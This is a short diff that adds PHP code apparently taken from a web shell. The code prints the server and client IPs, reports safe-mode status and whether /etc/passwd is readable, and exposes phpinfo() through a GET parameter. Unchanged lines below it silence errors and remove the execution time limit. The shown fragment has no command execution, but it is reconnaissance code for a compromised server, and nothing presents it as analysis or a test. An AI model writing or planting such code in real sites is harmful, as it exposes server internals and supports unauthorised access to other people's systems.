@@ -1,5 +1,26 @@
-
+<tr><td>
+<center>
 <?php
+$etc_passwd = @is_readable("/etc/passwd") ? "<b><span style=\"color:white\">ON </span></b>" : "<b><span style=\"color:red\"/>off </span></b>";
+echo '<b><font color=red>Server IP  :   </b></font><b>'.$_SERVER['SERVER_ADDR'].' </b>';
+echo '<b><font color=red>Your IP :  </b></font><b>'.$_SERVER['REMOTE_ADDR'].'</b>';
+echo "</br>";
+echo "<b><font color=red>Safe Mode :  </font></b>";
+// Check for safe mode
+if( ini_get('safe_mode') ) {
+  print '<font color=#FF0000><b> ON</b></font>';
+} else {
+  print '<font color=#008000><b> OFF</b></font>';
+}
+echo "</br>";
+echo "<b><font color=red>Read etc/passwd : </font></b><b>$etc_passwd</b>";
+echo "<b><font color=red>Functions : </font><b>";echo "<a href='$php_self?p=info'>PHP INFO </a>";
+if(@$_GET['p']=="info"){@phpinfo();
+exit;}
+?>
+<br>
+</center>
+<?
 set_time_limit(0);
 error_reporting(0);
 
